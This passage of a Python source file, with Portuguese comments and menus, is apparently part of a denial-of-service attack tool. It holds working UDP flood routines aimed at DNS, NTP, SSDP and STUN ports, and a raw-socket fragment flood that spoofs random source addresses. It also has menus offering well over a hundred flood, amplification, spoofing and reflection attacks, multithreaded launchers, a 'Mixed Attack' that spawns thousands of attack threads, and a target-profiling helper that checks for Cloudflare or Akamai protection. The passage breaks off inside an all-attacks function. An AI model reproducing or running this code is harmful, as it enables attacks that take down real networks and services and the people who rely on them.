            print(Fore.GREEN + f"  [UDP-SSDP] Enviado para {target}:1900" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_mass_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(65535) + b"x" * 32768  # 96KB payload
            sock.sendto(payload[:65507], (target, port))  # Limita ao tamanho máximo UDP
            print(Fore.GREEN + f"  [UDP-MASS] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)
        
def udp_random_port_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(16384)
            port = random.randint(1, 65535)
            sock.sendto(payload, (target, port))
            print(Fore.GREEN + f"  [UDP-RANDOM-PORT] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)
        
def udp_burst_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(16384)
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload, (target, port))
            print(Fore.GREEN + f"  [UDP-BURST] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_dns_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = dns.message.make_query(f"test{random.randint(1, 999999)}.com", dns.rdatatype.ANY).to_wire()
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (target, 53))
            print(Fore.GREEN + f"  [UDP-DNS-BURST] Enviado para {target}:53" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_ntp_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x17\x00\x03\x2a" + random._urandom(65535)  # NTP header + 64KB payload
            sock.sendto(payload[:65507], (target, 123))  # Limita ao tamanho máximo UDP
            print(Fore.GREEN + f"  [UDP-NTP-MASS] Enviado para {target}:123" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_ssdp_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: ssdp:all\r\nMX: 1\r\nMAN: \"ssdp:discover\"\r\n\r\n"
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (target, 1900))
            print(Fore.GREEN + f"  [UDP-SSDP-BURST] Enviado para {target}:1900" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_flood_multi_port(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(16384)
            for _ in range(10):  # 10 portas aleatórias por iteração
                port = random.randint(1, 65535)
                sock.sendto(payload, (target, port))
            print(Fore.GREEN + f"  [UDP-MULTI-PORT] Enviado para {target}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_stun_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x00\x01\x00\x00" + random._urandom(65535)  # STUN header + 64KB payload
            sock.sendto(payload[:65507], (target, 3478))  # Limita ao tamanho máximo UDP
            print(Fore.GREEN + f"  [UDP-STUN-MASS] Enviado para {target}:3478" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_random_payload_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(random.randint(1024, 65507))  # Tamanho aleatório entre 1KB e 64KB
            sock.sendto(payload, (target, port))
            print(Fore.GREEN + f"  [UDP-RANDOM-PAYLOAD] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_dns_random_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            domain = f"test{random.randint(1, 999999)}.{random.choice(['com', 'org', 'net'])}"
            payload = dns.message.make_query(domain, dns.rdatatype.ANY).to_wire() + random._urandom(16384)
            sock.sendto(payload, (target, 53))
            print(Fore.GREEN + f"  [UDP-DNS-RANDOM] Enviado para {target}:53" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_ntp_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x17\x00\x03\x2a" + random._urandom(16384)
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload, (target, 123))
            print(Fore.GREEN + f"  [UDP-NTP-BURST] Enviado para {target}:123" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_ssdp_random_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(32).hex().encode() + b" * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: ssdp:all\r\nMX: 1\r\nMAN: \"ssdp:discover\"\r\n\r\n" + random._urandom(16384)
            sock.sendto(payload, (target, 1900))
            print(Fore.GREEN + f"  [UDP-SSDP-RANDOM] Enviado para {target}:1900" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_flood_high_rate(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(16384)
            for _ in range(20):  # High rate: 20 pacotes por iteração
                sock.sendto(payload, (target, port))
            print(Fore.GREEN + f"  [UDP-HIGH-RATE] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_stun_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x00\x01\x00\x00" + random._urandom(16384)
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload, (target, 3478))
            print(Fore.GREEN + f"  [UDP-STUN-BURST] Enviado para {target}:3478" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)
        
def udp_fragment_mass_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 1480, random.randint(1, 65535), 0, 64, socket.IPPROTO_UDP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            udp_header = struct.pack("!HHHH", random.randint(1024, 65535), port, 1452, 0)
            payload = random._urandom(1444) + b"x" * 65535  # 64KB adicional
            sock.sendto(ip_header + udp_header + payload[:65507], (target, port))  # Limita ao tamanho máximo UDP
            print(Fore.GREEN + f"  [UDP-FRAG-MASS] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_dns_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = dns.message.make_query(f"test{random.randint(1, 999999)}.com", dns.rdatatype.ANY).to_wire() + random._urandom(65535)
            sock.sendto(payload[:65507], (target, 53))  # Limita ao tamanho máximo UDP
            print(Fore.GREEN + f"  [UDP-DNS-MASS] Enviado para {target}:53" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_ntp_random_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(4) + random._urandom(16384)  # Cabeçalho aleatório + 16KB payload
            sock.sendto(payload, (target, 123))
            print(Fore.GREEN + f"  [UDP-NTP-RANDOM] Enviado para {target}:123" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_ssdp_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: ssdp:all\r\nMX: 1\r\nMAN: \"ssdp:discover\"\r\n\r\n" + random._urandom(65535)
            sock.sendto(payload[:65507], (target, 1900))  # Limita ao tamanho máximo UDP
            print(Fore.GREEN + f"  [UDP-SSDP-MASS] Enviado para {target}:1900" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)



def show_main_menu():
    display_banner()
    print(Fore.YELLOW + Style.BRIGHT + "  Escolha uma categoria:" + Style.RESET_ALL)
    print(Fore.BLUE + "  [1] Ataques a Sites\n  [2] Ataques a Dispositivos\n  [3] Ataques de Rede Local e Reflexões\n  [4] Ataques a IPs\n  [5] Ataques ICMP e Amplificação\n  [6] Ataques a Serviços\n  [7] Ataques IoT\n  [8] Ataques VoIP\n  [9] Ataques Híbridos\n  [10] Ataques Exóticos\n  [11] Ataques UDP\n  [12] Configurar Proxies e Bots\n  [13] Verificar Proteção e Geolocalização\n  [14] Créditos\n  [15] Mixed Attack\n  [16] All Attacks\n  [0] Sair" + Style.RESET_ALL)
    print_line(Fore.CYAN, 100)
    choice = input(Fore.CYAN + "  Sua escolha (0-16): " + Style.RESET_ALL)
    return int(choice) if choice.isdigit() else -1

# Ataques a Sites
def show_sites_menu():
    clear_screen()
    print_line(Fore.CYAN, 100)
    print_centered("🌐 Ataques a Sites", 100, Fore.MAGENTA + Style.BRIGHT)
    print_line(Fore.CYAN, 100)
    print(Fore.YELLOW + Style.BRIGHT + "  Escolha um ataque:" + Style.RESET_ALL)
    print(Fore.BLUE + "  [1] Slowloris\n  [2] R-U-Dead-Yet (RUDY)\n  [3] HTTP Multi-Method Flood\n  [4] HTTP Keep-Alive Flood\n  [5] Slow Read\n  [6] HTTP Header Overload\n  [7] HTTP Random Path Flood\n  [8] HTTP Burst Multi Flood\n  [9] HTTP-GET Flood\n  [10] HTTP-POST Flood\n  [11] HTTP-HEAD Flood\n  [12] HTTP-OPTIONS Flood\n  [13] HTTP-TRACE Flood\n  [14] HTTP-PUT Flood\n  [15] HTTP-DELETE Flood\n  [16] HTTP-CONNECT Flood\n  [17] HTTP-PATCH Flood\n  [18] HTTP-GET Mass Flood\n  [19] HTTP-POST Burst Flood\n  [20] HTTP-GET Random Flood\n  [21] HTTP-POST Random Flood\n  [22] HTTP-HEAD Mass Flood\n  [23] HTTP-OPTIONS Burst Flood\n  [24] HTTP-TRACE Mass Flood\n  [25] HTTP-PUT Random Flood\n  [26] HTTP-DELETE Burst Flood\n  [27] HTTP-CONNECT Random Flood\n  [28] HTTP-PATCH Burst Flood\n  [0] Voltar" + Style.RESET_ALL)
    print_line(Fore.CYAN, 100)
    choice = input(Fore.CYAN + "  Sua escolha (0-28): " + Style.RESET_ALL)
    return int(choice) if choice.isdigit() else -1

# Ataques a Dispositivos
def show_devices_menu():
    clear_screen()
    print_line(Fore.CYAN, 100)
    print_centered("📱 Ataques a Dispositivos", 100, Fore.MAGENTA + Style.BRIGHT)
    print_line(Fore.CYAN, 100)
    print(Fore.YELLOW + Style.BRIGHT + "  Escolha um ataque:" + Style.RESET_ALL)
    print(Fore.BLUE + "  [1] SIP Flood\n  [2] CoAP Flood\n  [3] MQTT Flood\n  [4] Telnet Flood\n  [5] SIP Burst Flood\n  [6] CoAP Mass Flood\n  [7] MQTT Burst Flood\n  [8] Telnet Mass Flood\n  [9] SIP Random Flood\n  [10] CoAP Burst Flood\n  [11] MQTT Mass Flood\n  [12] Telnet Burst Flood\n  [13] SIP Mass Flood\n  [14] CoAP Random Flood\n  [15] MQTT Random Flood\n  [16] Telnet Random Flood\n  [17] UPnP Flood\n  [18] SNMP Flood\n  [19] UPnP Burst Flood\n  [20] SNMP Mass Flood\n  [21] SIP High Rate Flood\n  [22] CoAP High Rate Flood\n  [23] MQTT High Rate Flood\n  [24] Telnet High Rate Flood\n  [0] Voltar" + Style.RESET_ALL)
    print_line(Fore.CYAN, 100)
    choice = input(Fore.CYAN + "  Sua escolha (0-24): " + Style.RESET_ALL)
    return int(choice) if choice.isdigit() else -1

# Ataques de Rede Local e Reflexões
def show_network_reflection_menu():
    clear_screen()
    print_line(Fore.CYAN, 100)
    print_centered("🌐 Ataques de Rede Local e Reflexões", 100, Fore.MAGENTA + Style.BRIGHT)
    print_line(Fore.CYAN, 100)
    print(Fore.YELLOW + Style.BRIGHT + "  Escolha um ataque:" + Style.RESET_ALL)
    print(Fore.BLUE + "  [1] ARP Spoofing\n  [2] MAC Flooding\n  [3] ARP Burst Spoofing\n  [4] MAC Mass Flooding\n  [5] ARP Random Spoofing\n  [6] MAC Burst Flooding\n  [7] ARP High Rate Spoofing\n  [8] MAC High Rate Flooding\n  [9] DNS Reflection\n  [10] NTP Reflection\n  [11] SSDP Reflection\n  [12] SNMP Reflection\n  [13] DNS Burst Reflection\n  [14] NTP Mass Reflection\n  [15] SSDP Burst Reflection\n  [16] SNMP Mass Reflection\n  [17] DNS High Rate Reflection\n  [18] NTP Burst Reflection\n  [19] SSDP High Rate Reflection\n  [20] SNMP Burst Reflection\n  [0] Voltar" + Style.RESET_ALL)
    print_line(Fore.CYAN, 100)
    choice = input(Fore.CYAN + "  Sua escolha (0-20): " + Style.RESET_ALL)
    return int(choice) if choice.isdigit() else -1

# Ataques a IPs
def show_ips_menu():
    clear_screen()
    print_line(Fore.CYAN, 100)
    print_centered("🌍 Ataques a IPs", 100, Fore.MAGENTA + Style.BRIGHT)
    print_line(Fore.CYAN, 100)
    print(Fore.YELLOW + Style.BRIGHT + "  Escolha um ataque:" + Style.RESET_ALL)
    print(Fore.BLUE + "  [1] SYN Flood\n  [2] TCP RST Flood\n  [3] TCP FIN Flood\n  [4] TCP ACK Flood\n  [5] TCP PSH Flood\n  [6] TCP XMAS Flood\n  [7] TCP NULL Flood\n  [8] TCP LAND Flood\n  [0] Voltar" + Style.RESET_ALL)
    print_line(Fore.CYAN, 100)
    choice = input(Fore.CYAN + "  Sua escolha (0-8): " + Style.RESET_ALL)
    return int(choice) if choice.isdigit() else -1

# Ataques ICMP e Amplificação
def show_icmp_amplification_menu():
    clear_screen()
    print_line(Fore.CYAN, 100)
    print_centered("🌐 Ataques ICMP e Amplificação", 100, Fore.MAGENTA + Style.BRIGHT)
    print_line(Fore.CYAN, 100)
    print(Fore.YELLOW + Style.BRIGHT + "  Escolha um ataque:" + Style.RESET_ALL)
    print(Fore.BLUE + "  [1] ICMP Flood\n  [2] ICMP Smurf\n  [3] ICMP Ping Flood\n  [4] ICMP Burst Flood\n  [5] ICMP Mass Flood\n  [6] ICMP Random Flood\n  [7] ICMP Smurf Burst\n  [8] DNS Amplification\n  [9] NTP Amplification\n  [10] SSDP Amplification\n  [11] SNMP Amplification\n  [12] CLDAP Amplification\n  [13] Memcached Amplification\n  [14] LDAP Amplification\n  [15] Chargen Amplification\n  [16] QOTD Amplification\n  [17] DNS Burst Amplification\n  [18] NTP Mass Amplification\n  [19] SSDP Mass Amplification\n  [20] SNMP Burst Amplification\n  [21] CLDAP Mass Amplification\n  [22] Memcached Burst Amplification\n  [23] LDAP Burst Amplification\n  [0] Voltar" + Style.RESET_ALL)
    print_line(Fore.CYAN, 100)
    choice = input(Fore.CYAN + "  Sua escolha (0-23): " + Style.RESET_ALL)
    return int(choice) if choice.isdigit() else -1

# Ataques a Serviços
def show_services_menu():
    clear_screen()
    print_line(Fore.CYAN, 100)
    print_centered("🌐 Ataques a Serviços", 100, Fore.MAGENTA + Style.BRIGHT)
    print_line(Fore.CYAN, 100)
    print(Fore.YELLOW + Style.BRIGHT + "  Escolha um ataque:" + Style.RESET_ALL)
    print(Fore.BLUE + "  [1] FTP Flood\n  [2] SMTP Flood\n  [3] DNS Service Flood\n  [4] SSH Flood\n  [5] HTTP Service Flood\n  [6] FTP Burst Flood\n  [7] SMTP Mass Flood\n  [8] DNS Service Burst Flood\n  [9] SSH Mass Flood\n  [10] HTTP Service Mass Flood\n  [11] FTP Random Flood\n  [12] SMTP Burst Flood\n  [13] DNS Service Mass Flood\n  [14] SSH Burst Flood\n  [15] HTTP Service Burst Flood\n  [16] FTP High Rate Flood\n  [17] SMTP Random Flood\n  [18] DNS Service High Rate Flood\n  [19] SSH Random Flood\n  [20] HTTP Service Random Flood\n  [21] POP3 Flood\n  [22] IMAP Flood\n  [23] POP3 Burst Flood\n  [24] IMAP Mass Flood\n  [0] Voltar" + Style.RESET_ALL)
    print_line(Fore.CYAN, 100)
    choice = input(Fore.CYAN + "  Sua escolha (0-24): " + Style.RESET_ALL)
    return int(choice) if choice.isdigit() else -1

# Ataques IoT
def show_iot_menu():
    clear_screen()
    print_line(Fore.CYAN, 100)
    print_centered("🌐 Ataques IoT", 100, Fore.MAGENTA + Style.BRIGHT)
    print_line(Fore.CYAN, 100)
    print(Fore.YELLOW + Style.BRIGHT + "  Escolha um ataque:" + Style.RESET_ALL)
    print(Fore.BLUE + "  [1] CoAP Burst Flood\n  [2] MQTT Mass Flood\n  [3] CoAP Mass Flood\n  [4] MQTT Burst Flood\n  [5] CoAP Random Flood\n  [6] MQTT Random Flood\n  [7] CoAP High Rate Flood\n  [8] MQTT High Rate Flood\n  [9] IoT SSDP Flood\n  [10] IoT SSDP Burst Flood\n  [11] IoT SNMP Flood\n  [12] IoT SNMP Mass Flood\n  [13] CoAP Mass Burst Flood\n  [0] Voltar" + Style.RESET_ALL)
    print_line(Fore.CYAN, 100)
    choice = input(Fore.CYAN + "  Sua escolha (0-13): " + Style.RESET_ALL)
    return int(choice) if choice.isdigit() else -1

# Ataques VoIP
def show_voip_menu():
    clear_screen()
    print_line(Fore.CYAN, 100)
    print_centered("🌐 Ataques VoIP", 100, Fore.MAGENTA + Style.BRIGHT)
    print_line(Fore.CYAN, 100)
    print(Fore.YELLOW + Style.BRIGHT + "  Escolha um ataque:" + Style.RESET_ALL)
    print(Fore.BLUE + "  [1] SIP High Rate Flood\n  [2] H.323 Flood\n  [3] SIP Mass Flood\n  [4] H.323 Burst Flood\n  [5] SIP Random Flood\n  [6] H.323 Mass Flood\n  [7] RTP Flood\n  [8] RTP Mass Flood\n  [9] RTP Burst Flood\n  [10] SIP Random Burst Flood\n  [11] H.323 Random Flood\n  [0] Voltar" + Style.RESET_ALL)
    print_line(Fore.CYAN, 100)
    choice = input(Fore.CYAN + "  Sua escolha (0-11): " + Style.RESET_ALL)
    return int(choice) if choice.isdigit() else -1

# Ataques Híbridos e Exóticos
def show_hybrid_exotic_menu():
    clear_screen()
    print_line(Fore.CYAN, 100)
    print_centered("🌐 Ataques Híbridos e Exóticos", 100, Fore.MAGENTA + Style.BRIGHT)
    print_line(Fore.CYAN, 100)
    print(Fore.YELLOW + Style.BRIGHT + "  Escolha um ataque:" + Style.RESET_ALL)
    print(Fore.BLUE + "  [1] Híbrido HTTP-UDP Flood\n  [2] Híbrido TCP-SYN + HTTP Flood\n  [3] Híbrido ICMP-UDP Flood\n  [4] Híbrido HTTP-SIP Flood\n  [5] Híbrido UDP-CoAP Flood\n  [6] Híbrido TCP-MQTT Flood\n  [7] GRE Flood\n  [8] IP Fragment Flood\n  [9] Chargen Flood\n  [10] QOTD Flood\n  [11] Híbrido HTTP-UDP Burst Flood\n  [12] Híbrido TCP-SYN + SIP Flood\n  [13] GRE Burst Flood\n  [14] IP Fragment Mass Flood\n  [15] Chargen Burst Flood\n  [16] QOTD Mass Flood\n  [17] Híbrido UDP-RTP Flood\n  [18] Híbrido ICMP-CoAP Flood\n  [19] GRE Mass Flood\n  [20] IP Fragment Burst Flood\n  [0] Voltar" + Style.RESET_ALL)
    print_line(Fore.CYAN, 100)
    choice = input(Fore.CYAN + "  Sua escolha (0-20): " + Style.RESET_ALL)
    return int(choice) if choice.isdigit() else -1

# Ataques UDP
def show_udp_menu():
    clear_screen()
    print_line(Fore.CYAN, 100)
    print_centered("🌐 Ataques UDP", 100, Fore.MAGENTA + Style.BRIGHT)
    print_line(Fore.CYAN, 100)
    print(Fore.YELLOW + Style.BRIGHT + "  Escolha um ataque:" + Style.RESET_ALL)
    print(Fore.BLUE + "  [1] UDP Flood\n  [2] UDP STUN Flood\n  [3] UDP Fragment Flood\n  [4] UDP DNS Flood\n  [5] UDP NTP Flood\n  [6] UDP SSDP Flood\n  [7] UDP Mass Flood\n  [8] UDP Random Port Flood\n  [9] UDP Burst Flood\n  [10] UDP DNS Burst Flood\n  [11] UDP NTP Mass Flood\n  [12] UDP SSDP Burst Flood\n  [13] UDP Flood Multi-Port\n  [14] UDP STUN Mass Flood\n  [15] UDP Random Payload Flood\n  [16] UDP DNS Random Flood\n  [17] UDP NTP Burst Flood\n  [18] UDP SSDP Random Flood\n  [19] UDP Flood High Rate\n  [20] UDP STUN Burst Flood\n  [21] UDP Fragment Mass Flood\n  [22] UDP DNS Mass Flood\n  [23] UDP NTP Random Flood\n  [24] UDP SSDP Mass Flood\n  [0] Voltar" + Style.RESET_ALL)
    print_line(Fore.CYAN, 100)
    choice = input(Fore.CYAN + "  Sua escolha (0-24): " + Style.RESET_ALL)
    return int(choice) if choice.isdigit() else -1

def start_attack(attack_func, target, port, proxies, agents, duration):
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    threads = []
    for _ in range(THREADS):
        proxy = random.choice(proxies) if proxies else Proxy(address="http://127.0.0.1:8080")  # Proxy padrão
        agent = random.choice(agents)
        thread = threading.Thread(target=attack_func, args=(target, port, proxy, agent, duration))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    ATTACK_RUNNING = False
    print(Fore.GREEN + f"{attack_func.__name__.replace('_', ' ').title()} concluído!" + Style.RESET_ALL)

def udp_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(65507)  # Máximo tamanho UDP
            sock.sendto(payload, (target, port))
            print(Fore.GREEN + f"  [UDP] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)  # Intervalo ultra baixo

def start_tcp_attack(attack_func, target, port, duration):
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(target=attack_func, args=(target, port, duration))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    ATTACK_RUNNING = False
    print(Fore.GREEN + f"{attack_func.__name__.replace('_', ' ').title()} concluído!" + Style.RESET_ALL)



def check_site_protection_and_geo(domain):
    try:
        # Resolução de IP
        ip = socket.gethostbyname(domain)
        print(Fore.GREEN + f"  IP resolvido: {ip}" + Style.RESET_ALL)

        # Geolocalização usando API pública (ex.: ip-api.com)
        response = requests.get(f"http://ip-api.com/json/{ip}")
        if response.status_code == 200:
            geo_data = response.json()
            print(Fore.GREEN + f"  Geolocalização:" + Style.RESET_ALL)
            print(Fore.YELLOW + f"    País: {geo_data.get('country', 'Desconhecido')}" + Style.RESET_ALL)
            print(Fore.YELLOW + f"    Cidade: {geo_data.get('city', 'Desconhecida')}" + Style.RESET_ALL)
            print(Fore.YELLOW + f"    ISP: {geo_data.get('isp', 'Desconhecido')}" + Style.RESET_ALL)
            print(Fore.YELLOW + f"    Latitude: {geo_data.get('lat', 'N/A')}, Longitude: {geo_data.get('lon', 'N/A')}" + Style.RESET_ALL)
        else:
            print(Fore.RED + "  Falha ao obter geolocalização." + Style.RESET_ALL)

        # Verificação básica de proteção (Cloudflare, etc.)
        headers = requests.get(f"http://{domain}", timeout=5).headers
        if "cloudflare" in headers.get("Server", "").lower():
            print(Fore.RED + "  Proteção detectada: Cloudflare" + Style.RESET_ALL)
        elif "akamai" in headers.get("Server", "").lower():
            print(Fore.RED + "  Proteção detectada: Akamai" + Style.RESET_ALL)
        else:
            print(Fore.GREEN + "  Nenhuma proteção conhecida detectada." + Style.RESET_ALL)

    except Exception as e:
        print(Fore.RED + f"  Erro ao verificar: {str(e)}" + Style.RESET_ALL)

def start_attack_no_port(attack_func, target, duration):
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(target=attack_func, args=(target, duration))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    ATTACK_RUNNING = False
    print(Fore.GREEN + f"{attack_func.__name__.replace('_', ' ').title()} concluído!" + Style.RESET_ALL)

def start_attack_gateway(attack_func, target_ip, gateway_ip, duration):
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(target=attack_func, args=(target_ip, gateway_ip, duration))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    ATTACK_RUNNING = False
    print(Fore.GREEN + f"{attack_func.__name__.replace('_', ' ').title()} concluído!" + Style.RESET_ALL)

def start_attack_interface(attack_func, interface, duration):
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(target=attack_func, args=(interface, duration))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    ATTACK_RUNNING = False
    print(Fore.GREEN + f"{attack_func.__name__.replace('_', ' ').title()} concluído!" + Style.RESET_ALL)

def start_attack_broadcast(attack_func, target, broadcast_ip, duration):
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(target=attack_func, args=(target, broadcast_ip, duration))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    ATTACK_RUNNING = False
    print(Fore.GREEN + f"{attack_func.__name__.replace('_', ' ').title()} concluído!" + Style.RESET_ALL)

# Função para Mixed Attack (combinação aleatória de ataques)
def mixed_attack(target, port, proxies, agents, duration):
    attack_methods = [
        # Parte 1 e 3 - HTTP
        lambda: http_get_flood(target, port, random.choice(proxies), random.choice(agents), duration),
        lambda: http_post_flood(target, port, random.choice(proxies), random.choice(agents), duration),
        # Parte 2 - HTTP Avançados
        lambda: slowloris(target, port, random.choice(proxies), random.choice(agents), duration),
        lambda: rudy_attack(target, port, random.choice(proxies), random.choice(agents), duration),
        # Parte 2 - TCP
        lambda: syn_flood(target, port, duration),
        lambda: tcp_ack_flood(target, port, duration),
        # Parte 4 - UDP
        lambda: udp_flood(target, port, duration),
        lambda: udp_dns_flood(target, duration),
        # Parte 5 - ICMP e Amplificação
        lambda: icmp_flood(target, duration),
        lambda: dns_amplification(target, duration),
        # Parte 6 - Dispositivos
        lambda: sip_flood(target, duration),
        lambda: coap_flood(target, duration),
        # Parte 7 - Rede Local e Reflexões
        lambda: dns_reflection(target, duration),
        # Parte 8 - Serviços
        lambda: ftp_flood(target, duration),
        # Parte 9 - IoT e VoIP
        lambda: mqtt_mass_flood_iot(target, duration),
        lambda: sip_high_rate_flood_voip(target, duration),
        # Parte 10 - Híbridos e Exóticos
        lambda: hybrid_http_udp_flood(target, port, random.choice(proxies), random.choice(agents), duration),
        lambda: gre_flood(target, duration)
    ]
    for _ in range(2000):  # 2000 iterações de ataques aleatórios
        method = random.choice(attack_methods)
        thread = threading.Thread(target=method)
        thread.start()

def start_mixed_attack(target, port, proxies, agents, duration):
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(target=mixed_attack, args=(target, port, proxies, agents, duration))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    ATTACK_RUNNING = False
    print(Fore.GREEN + "Mixed Attack concluído!" + Style.RESET_ALL)

#all_atacks
def all_attacks(target, port, proxies, agents, duration, interface=None, gateway_ip=None, broadcast_ip=None):
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    threads = []

